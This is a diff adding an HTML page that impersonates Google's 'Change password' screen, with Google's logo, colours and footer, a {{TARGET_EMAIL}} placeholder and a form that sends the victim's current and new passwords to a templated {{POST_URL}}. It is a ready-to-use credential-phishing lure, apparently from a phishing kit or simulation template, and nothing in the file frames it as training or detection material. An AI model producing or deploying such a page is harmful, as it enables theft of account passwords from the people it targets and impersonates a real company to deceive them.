@@ -1,0 +1,50 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google - Reset your password</title>
+    <style>
+        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; min-height: 100vh; margin: 0; }
+        .card { width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
+        .logo { width: 75px; margin-bottom: 10px; }
+        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; color: #202124; }
+        p { font-size: 16px; color: #202124; margin-bottom: 30px; }
+        .input-group { position: relative; margin-bottom: 25px; text-align: left; }
+        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; box-sizing: border-box; outline: none; }
+        input:focus { border: 2px solid #1a73e8; padding: 12px 14px; }
+        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-size: 14px; font-weight: 500; cursor: pointer; float: right; margin-top: 10px; }
+        .btn:hover { background-color: #1b66c9; box-shadow: 0 1px 3px 1px rgba(66,133,244,0.15); }
+        .clear { clear: both; }
+        .footer { margin-top: 50px; text-align: left; font-size: 12px; color: #70757a; }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <svg class="logo" viewBox="0 0 272 92" xmlns="http://www.w3.org/2000/svg">
+          <path fill="#4285f4" d="M115.75 47.18c0-3.14-.28-6.17-.8-9.08H73v17.18h23.97c-1.04 5.56-4.14 10.28-8.9 13.47v11.18h14.42c8.43-7.75 13.26-19.18 13.26-32.75Z"/>
+          <path fill="#34a853" d="M73 90.71c12.02 0 22.1-3.98 29.47-10.78l-14.42-11.18c-3.99 2.68-9.1 4.26-15.05 4.26-11.58 0-21.4-7.81-24.9-18.3H13.1v11.53c7.34 14.58 22.5 24.47 39.9 24.47Z"/>
+          <path fill="#fbbc05" d="M48.1 64.71c-1.81-5.4-1.81-11.31 0-16.71V36.47H13.1c-7.23 14.41-7.23 31.06 0 45.47l35-17.23Z"/>
+          <path fill="#ea4335" d="M73 28.29c6.38-.03 12.51 2.37 17.06 6.72l12.8-12.8C94.8 14.47 84.18 10.26 73 10.29c-17.4 0-32.56 9.89-39.9 24.47l35 17.23c3.5-10.49 13.32-18.3 24.9-18.3Z"/>
+        </svg>
+        <h1>Change password</h1>
+        <p>Enter a new password for <strong>{{TARGET_EMAIL}}</strong> to regain access to your account.</p>
+        <form action="{{POST_URL}}" method="POST">
+            <div class="input-group">
+                <input type="password" name="old_password" placeholder="Current password" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="new_password" placeholder="Create new password" required>
+            </div>
+            <div class="input-group">
+                <input type="password" name="confirm_password" placeholder="Confirm new password" required>
+            </div>
+            <button type="submit" class="btn">Change password</button>
+            <div class="clear"></div>
+        </form>
+        <div class="footer">
+            English (United States) &nbsp;&nbsp; Help &nbsp;&nbsp; Privacy &nbsp;&nbsp; Terms
+        </div>
+    </div>
+</body>
+</html>
